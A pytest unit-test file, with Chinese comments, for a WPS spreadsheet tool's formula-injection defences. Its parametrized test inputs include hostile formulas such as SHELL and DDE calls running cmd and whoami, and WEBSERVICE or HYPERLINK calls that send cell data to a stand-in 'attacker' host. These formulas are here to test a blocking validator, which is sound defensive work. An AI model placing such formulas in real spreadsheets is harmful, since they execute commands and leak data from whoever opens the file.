"""CalcService 单元测试 — 重点覆盖公式注入与单元格值校验"""

import pytest

from tests.conftest import MockApp, MockComBackend
from wps_cli.exceptions import ValidationError
from wps_cli.services.calc_service import (
    CalcService,
    _check_formula_safe,
    _coerce_cell_value,
)
from wps_cli.services.session_manager import SessionManager


def _make_svc() -> CalcService:
    return CalcService(manager=SessionManager(backend=MockComBackend()))


class TestFormulaSafety:
    """C-1：公式注入的核心防御"""

    def test_safe_formula_accepted(self):
        _check_formula_safe("=SUM(A1:A10)")
        _check_formula_safe("=IF(A1>0, B1, C1)")
        _check_formula_safe("=VLOOKUP(A1, B:C, 2, FALSE)")

    def test_must_start_with_equals(self):
        with pytest.raises(ValidationError, match="'='"):
            _check_formula_safe("SUM(A1:A10)")

    @pytest.mark.parametrize(
        "danger",
        [
            '=SHELL("cmd /c calc.exe")',
            "=shell('cmd')",
            '=DDE("cmd","/c whoami","")',
            '=DDEAUTO("a", "b", "c")',
            '=EXEC("calc")',
            '=HYPERLINK("http://attacker/"&A1, "x")',
            '=CALL("x","y","z")',
            '=REGISTER("x","y","z")',
            '= SHELL ( "calc" )',  # 空格混淆
            # H-2 第二轮新增
            '=WEBSERVICE("http://attacker/?d="&A1)',
            '=FILTERXML(WEBSERVICE("..."), "//x")',
            '=RTD("server","a","b")',
            '=IMPORTDATA("http://attacker/")',
            '=_XLFN.WEBSERVICE("http://attacker/")',
            "=ENCODEURL(A1)",
        ],
    )
    def test_dangerous_formulas_blocked(self, danger):
        with pytest.raises(ValidationError, match="禁止"):
            _check_formula_safe(danger)


class TestCellValueCoercion:
    """H-5：cell_set 的值不能以 = 开头（公式注入二次路径）"""

    def test_plain_string_ok(self):
        assert _coerce_cell_value("hello") == "hello"

    def test_number_ok(self):
        assert _coerce_cell_value(123) == 123

    def test_formula_like_string_rejected(self):
        with pytest.raises(ValidationError, match="公式"):
            _coerce_cell_value("=1+1")

    def test_formula_with_leading_space_still_rejected(self):
        with pytest.raises(ValidationError):
            _coerce_cell_value('   =SHELL("cmd")')


class TestCalcServiceUnit:
    """少量直接覆盖 service 方法的快速测试，依赖 MockApp"""

    def test_cell_set_blocks_formula_via_value(self):
        svc = _make_svc()
        app = MockApp("calc")

        # 让 _ws 走通：注入最小骨架
        class _R:
            def __init__(self):
                self.Value = None
                self.Formula = None

        class _Sheet:
            def __init__(self):
                self._r = _R()

            def Range(self, ref):  # noqa: N802 - 模拟 COM API 命名
                return self._r

        app.ActiveSheet = _Sheet()
        with pytest.raises(ValidationError):
            svc.cell_set(app, "A1", '=DDE("cmd","/c whoami","")')

    def test_cell_formula_blocks_dangerous(self):
        svc = _make_svc()
        app = MockApp("calc")

        class _R:
            Formula = None

        class _Sheet:
            def Range(self, ref):  # noqa: N802
                return _R()

        app.ActiveSheet = _Sheet()
        with pytest.raises(ValidationError):
            svc.cell_formula(app, "A1", '=SHELL("cmd")')
